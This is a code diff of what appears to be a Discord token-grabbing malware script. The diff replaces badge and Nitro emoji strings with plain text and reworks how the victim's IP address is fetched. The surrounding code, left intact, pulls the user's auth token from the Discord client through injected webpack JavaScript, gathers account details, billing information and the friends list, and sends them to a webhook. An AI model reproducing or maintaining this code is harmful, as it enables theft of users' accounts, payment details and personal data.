@@ -36,52 +36,52 @@ var config = {
     badges: {
         Discord_Employee: {
             Value: 1,
-            Emoji: "<:staff:874750808728666152>",
+            Emoji: "Discord Employee",
             Rare: true,
         },
         Partnered_Server_Owner: {
             Value: 2,
-            Emoji: "<:partner:874750808678354964>",
+            Emoji: "Partnered Server Owner",
             Rare: true,
         },
         HypeSquad_Events: {
             Value: 4,
-            Emoji: "<:hypesquad_events:874750808594477056>",
+            Emoji: "HypeSquad Events",
             Rare: true,
         },
         Bug_Hunter_Level_1: {
             Value: 8,
-            Emoji: "<:bughunter_1:874750808426692658>",
+            Emoji: "Bug Hunter Level 1",
             Rare: true,
         },
         Early_Supporter: {
             Value: 512,
-            Emoji: "<:early_supporter:874750808414113823>",
+            Emoji: "Early Supporter",
             Rare: true,
         },
         Bug_Hunter_Level_2: {
             Value: 16384,
-            Emoji: "<:bughunter_2:874750808430874664>",
+            Emoji: "Bug Hunter Level 2",
             Rare: true,
         },
         Early_Verified_Bot_Developer: {
             Value: 131072,
-            Emoji: "<:developer:874750808472825986>",
+            Emoji: "Early Verified Bot Developer",
             Rare: true,
         },
         House_Bravery: {
             Value: 64,
-            Emoji: "<:bravery:874750808388952075>",
+            Emoji: "House Bravery",
             Rare: false,
         },
         House_Brilliance: {
             Value: 128,
-            Emoji: "<:brilliance:874750808338608199>",
+            Emoji: "House Brilliance",
             Rare: false,
         },
         House_Balance: {
             Value: 256,
-            Emoji: "<:balance:874750808267292683>",
+            Emoji: "House Balance",
             Rare: false,
         }
     },
@@ -256,7 +256,7 @@ var event_handlers = {
         const userInfo = await getUserInfo(token);
         const billing = await getBilling(token);
         const friends = await getRelationships(token);
-        var ip = await getIp();
+        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -326,7 +326,7 @@ var event_handlers = {
         const userInfo = await getUserInfo(token);
         const billing = await getBilling(token);
         const friends = await getRelationships(token);
-        var ip = await getIp();
+        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -395,7 +395,7 @@ var event_handlers = {
         var userInfo = await getUserInfo(token);
         var billing = await getBilling(token);
         var friends = await getRelationships(token);
-        var ip = await getIp();
+        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -464,7 +464,7 @@ var event_handlers = {
         var userInfo = await getUserInfo(token);
         var billing = await getBilling(token);
         var friends = await getRelationships(token);
-        var ip = await getIp();
+        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -548,9 +548,9 @@ function getNitro(flags) {
         case 0:
             return "\`No Nitro\`";
         case 1:
-            return "<:latest:1047566416615850064>";
+            return "Nitro classic";
         case 2:
-            return "<:nitro_boost:1047565806470447126>";
+            return "Nitro boost";
         default:
             return "\`No Nitro\`";
 
@@ -578,10 +578,6 @@ function getBadges(flags) {
 
 async function getToken() {
     return await execScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
-}
-
-async function getIp() {
-    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://ipinfo.io/json", false );xmlHttp.send( null );xmlHttp.responseText;`, true));
 }
 
 async function getUserInfo(token) {
@@ -688,12 +684,12 @@ async function initialize() {
 
         token = await getToken();
 
-        const network_data = await getIp()
+        const network_data = (await getIp())['ip'] || "127.0.0.1"
 
         var userInfo;
         var billing;
         var friends;
-        var ip = await getIp();
+        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         if (config.notify_on_initialization) {
             if (token == undefined) {
@@ -738,7 +734,7 @@ async function initialize() {
                 userInfo = await getUserInfo(token);
                 billing = await getBilling(token);
                 friends = await getRelationships(token);
-                var ip = await getIp();
+                var ip = (await getIp())['ip'] || "127.0.0.1";
 
                 sendToWebhook({
                     username: config.embed.username,
